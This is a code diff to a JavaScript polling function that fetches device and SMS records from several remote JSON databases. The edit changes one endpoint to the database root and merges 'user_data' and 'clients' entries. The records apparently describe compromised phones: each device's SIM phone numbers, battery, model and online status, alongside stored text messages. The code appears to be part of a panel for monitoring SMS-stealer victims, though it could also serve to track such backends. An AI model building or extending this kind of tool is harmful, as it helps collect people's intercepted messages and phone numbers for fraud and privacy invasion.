@@ -261,7 +261,7 @@ async function pollTarget(target) {
     // ── Determine main endpoint ──────────────────────────────────────────────
     let mainEP;
     if (schema === 1)                               mainEP = `${url}/All_Users.json`;
-    else if (schema === 2 || schema === 4)          mainEP = `${url}/clients.json`;
+    else if (schema === 2 || schema === 4)          mainEP = `${url}/.json`;  // Changed to root to get both clients and user_data
     else if (schema === 3)                          mainEP = `${url}/user_data.json`;
     else if (schema === 5)                          mainEP = `${url}/devices.json`;
     else if (schema === 6)                          mainEP = `${url}/data.json`;
@@ -297,6 +297,26 @@ async function pollTarget(target) {
     } else if (schema === 9) {
       rawDevs = data?.user_data || {};
       allSms  = data?.user_sms  || {};
+    } else if (schema === 2 || schema === 4) {
+      // Schema 2: Handle both clients and user_data (some DBs have both)
+      const ud = data?.user_data || {};
+      const cl = data?.clients   || {};
+      // Merge: user_data first (usually has more complete info), then clients
+      // Use a Set to track which IDs we've already added to avoid duplicates
+      const seenIds = new Set();
+      for (const [k,v] of Object.entries(ud)) {
+        if (v && typeof v==='object') {
+          rawDevs[k] = {...v, _src:'user_data'};
+          seenIds.add(k);
+        }
+      }
+      for (const [k,v] of Object.entries(cl)) {
+        if (!seenIds.has(k) && v && typeof v==='object') {
+          rawDevs[k] = {...v, _src:'clients'};
+          seenIds.add(k);
+        }
+      }
+      allSms = data?.user_sms || data?.messages || {};
     } else if (schema === 10) {
       rawDevs = data?.clients  || {};
       allSms  = data?.messages || {};
@@ -465,14 +485,26 @@ async function pollTarget(target) {
         isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
 
       } else if (schema === 2 || schema === 4) {
-        const sims = dinfo.sims || [];
-        s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
-        s2    = sims[1]?.phoneNumber || 'N/A';
-        bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
-        brand = dinfo.modelName || dinfo.brand || dinfo.label || 'Unknown';
-        // Schema 4: status is boolean (true = online); schema 2: 'online'/'true'
-        isOn  = dinfo.status === true || dinfo.status === 'online' || dinfo.status === 'Online'
-                || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        // Handle both user_data and clients sources
+        if (dinfo._src === 'user_data') {
+          // user_data source (like DB2): Schema 9 style
+          s1    = dinfo.phoneNumber || 'N/A';
+          s2    = 'N/A';
+          const bv = dinfo.battery;
+          bat   = bv != null && bv !== 'N/A' ? (String(bv).endsWith('%') ? String(bv) : `${bv}%`) : 'N/A';
+          brand = dinfo.d_name || 'Unknown';
+          isOn  = dinfo.status === 'online' || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        } else {
+          // clients source: standard Schema 2 processing
+          const sims = dinfo.sims || [];
+          s1    = sims[0]?.phoneNumber || dinfo.mobNo || 'N/A';
+          s2    = sims[1]?.phoneNumber || 'N/A';
+          bat   = dinfo.battery != null ? String(dinfo.battery) : 'N/A';
+          brand = dinfo.modelName || dinfo.brand || dinfo.label || 'Unknown';
+          // Schema 4: status is boolean (true = online); schema 2: 'online'/'true'
+          isOn  = dinfo.status === true || dinfo.status === 'online' || dinfo.status === 'Online'
+                  || (maxTs > 0 && (Date.now() - maxTs) < STALE_MS);
+        }
 
       } else if (schema === 3 || schema === 6) {
         s1    = dinfo.numberSim1 || dinfo.phoneNumber || 'N/A';
